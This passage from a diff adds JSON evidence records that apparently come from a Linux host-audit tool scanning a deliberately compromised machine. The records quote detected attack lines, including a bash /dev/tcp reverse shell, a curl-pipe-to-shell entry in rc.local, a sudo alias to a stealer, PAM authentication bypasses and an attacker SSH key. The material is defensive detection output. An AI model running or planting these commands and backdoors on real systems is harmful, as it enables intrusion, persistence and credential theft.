+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-7cddc36facaaf88d",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_succeed_if.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-85e74b74c25e57c9",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_deny.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-8bce1bc58e380163",
+   "type": "network",
+   "ref": "tcp 0.0.0.0:9999",
+   "excerpts": [
+    "process nc/140"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    },
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-8d756747d6377f1b",
+   "type": "process",
+   "ref": "pid=100",
+   "excerpts": [
+    "ppid=1 user=root comm=sshd exe=/usr/sbin/sshd cmd=/usr/sbin/sshd -D"
+   ],
+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-8e96d08c76f3a74f",
+   "type": "file",
+   "ref": "/etc/cron.d/commented",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-8f030208d48b03d0",
+   "type": "file",
+   "ref": "/etc/sudoers",
+   "excerpts": [
+    "root ALL=(ALL:ALL) ALL",
+    "%sudo ALL=(ALL:ALL) ALL"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SUDO-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-92a326160928b1c8",
+   "type": "file",
+   "ref": "/etc/pam.d/su-bad",
+   "excerpts": [
+    "auth required pam_permit.so with no earlier authenticating module in this file"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-PERMIT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-936772d2b9925dd0",
+   "type": "file",
+   "ref": "/etc/pam.d/bypass2",
+   "excerpts": [
+    "auth sufficient pam_permit.so accepts any user without a password check"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-PERMIT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-96a21e6dbd3d52e3",
+   "type": "file",
+   "ref": "/etc/rc.local",
+   "excerpts": [
+    "download piped to shell: curl http://203.0.113.7/x.sh | sh"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-RC-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-STARTUP-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-9bad1d85a3169669",
+   "type": "other",
+   "ref": "cron.service",
+   "excerpts": [
+    "active/running Regular background program processing",
+    "enabled"
+   ],
+   "provenance": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-INFO-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    },
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-ENABLED-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    }
+   ]
+  },
+  {
+   "id": "EV-9d44347465c4ed07",
+   "type": "file",
+   "ref": "/tmp/.X0-lock",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-a19b6e0a46463c44",
+   "type": "file",
+   "ref": "/home/alice/.bashrc",
+   "excerpts": [
+    "references world-writable directory; aliases a privileged command: alias sudo='/tmp/steal'"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SHELL-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+    }
+   ]
+  },
+  {
+   "id": "EV-a6b0c1ce2213a8b9",
+   "type": "network",
+   "ref": "10.0.0.10:48880 -> 203.0.113.5:4444",
+   "excerpts": [
+    "process bash/302"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    },
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    },
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-a8d7af5edd03e0b8",
+   "type": "network",
+   "ref": "tcp 127.0.0.1:3306",
+   "excerpts": [
+    "process mysqld/120"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-adc89bc75279f22f",
+   "type": "process",
+   "ref": "pid=302",
+   "excerpts": [
+    "ppid=200 user=alice comm=bash exe=/usr/bin/bash cmd=bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
+    "user=alice bash /dev/tcp redirect (reverse-shell pattern): bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
+   ],
+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    },
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-CMD-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-b3c8e5743a64551a",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_permit.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-b5fb406be36a4291",
+   "type": "file",
+   "ref": "/etc/pam.d/sshd",
+   "excerpts": [
+    "auth optional /opt/evil/pam_capture.so",
+    "auth optional pam_ghost.so: not found in the system PAM module directories"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-MODULE-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-MODULE-002",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-bc4759191fe80e11",
+   "type": "network",
+   "ref": "tcp 0.0.0.0:23",
+   "excerpts": [
+    "process telnetd/110",
+    "process telnetd/110; telnet"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    },
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-EXPOSE-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-bd1a5f0743bbc426",
+   "type": "other",
+   "ref": "telnet.service",
+   "excerpts": [
+    "enabled"
+   ],
+   "provenance": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-ENABLED-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    },
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-LEGACY-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    }
+   ]
+  },
+  {
+   "id": "EV-c50723f1b37edbbe",
+   "type": "file",
+   "ref": "/etc/login.defs",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-cebc2eae3ed6a58b",
+   "type": "file",
+   "ref": "/proc/sys/kernel/tainted",
+   "provenance": [
+    {
+     "module": "linux.system",
+     "run_id": "06e047ce-017c-4c36-832c-60331b6c4182",
+     "check_id": "SYS-KERN-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "90b5aa4589ed0182e8e876e3b28940d54f0f20ea43e1ff911a45fd0f15e4a470"
+    }
+   ]
+  },
+  {
+   "id": "EV-cec18246ab8e3f3b",
+   "type": "file",
+   "ref": "/proc/mounts",
+   "excerpts": [
+    "/tmp (tmpfs) is mounted without nosuid, nodev, noexec"
+   ],
+   "provenance": [
+    {
+     "module": "linux.sysconfig",
+     "run_id": "0ee0cdf1-7246-4a1d-863b-3dba078c6cf0",
+     "check_id": "CFG-MNT-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "453e1f306fb1c819b042d9d412464340225e4841e623c475db240b6913d12ef2"
+    }
+   ]
+  },
+  {
+   "id": "EV-d4648cfcd4f40c2a",
+   "type": "file",
+   "ref": "/etc/profile.d/clean.sh",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-d796722dabb9c325",
+   "type": "file",
+   "ref": "/etc/pam.d/bypass3",
+   "excerpts": [
+    "auth sufficient pam_succeed_if.so uid >= 0 matches every user"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-PERMIT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-d8049199d16d384d",
+   "type": "file",
+   "ref": "/etc/group",
+   "excerpts": [
+    "group sudo: alice",
+    "group docker: bob"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-GROUP-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-GROUP-002",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-daf890bfe7a25191",
+   "type": "network",
+   "ref": "tcp 0.0.0.0:22",
+   "excerpts": [
+    "process sshd/100"
+   ],
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-dc8ef50cadc42dfb",
+   "type": "file",
+   "ref": "/etc/sudoers.d/README.bak",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-dd8690d1af9def68",
+   "type": "file",
+   "ref": "/etc/resolv.conf",
+   "provenance": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-DNS-001",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+    }
+   ]
+  },
+  {
+   "id": "EV-e2a4789854fb82f2",
+   "type": "file",
+   "ref": "/home/bob/.keep",
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    }
+   ]
+  },
+  {
+   "id": "EV-e967f790d1666531",
+   "type": "file",
+   "ref": "/home/alice/.ssh/authorized_keys",
+   "excerpts": [
+    "owner alice; type ssh-ed25519; label alice@laptop",
+    "owner alice; type ssh-rsa; label forced",
+    "owner alice: key with forced command option"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-005",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    }
+   ]
+  },
+  {
+   "id": "EV-eb1089520fd75a19",
+   "type": "process",
+   "ref": "pid=301",
+   "excerpts": [
+    "ppid=200 user=alice comm=kworker exe=/home/alice/.cache/kw cmd=[kworker/0:0]",
+    "user=alice cmd=[kworker/0:0] exe=/home/alice/.cache/kw",
+    "user=alice exe=/home/alice/.cache/kw"
+   ],
+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    },
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-MASQ-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    },
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-HIDDEN-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-ec506d58377e3fa5",
+   "type": "process",
+   "ref": "pid=200",
+   "excerpts": [
+    "ppid=100 user=alice comm=bash exe=/usr/bin/bash cmd=-bash"
+   ],
+   "provenance": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001",
+     "collected_at": "2026-11-02T01:49:59Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+    }
+   ]
+  },
+  {
+   "id": "EV-ef8140f7e8032cbd",
+   "type": "file",
+   "ref": "/root/.ssh/authorized_keys",
+   "excerpts": [
+    "owner root; type ssh-ed25519; label attacker@host",
+    "owner toor; type ssh-ed25519; label attacker@host",
+    "1 key(s) authorize direct root login"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-001",
+     "collected_at": "2026-11-02T01:50:01Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+    },
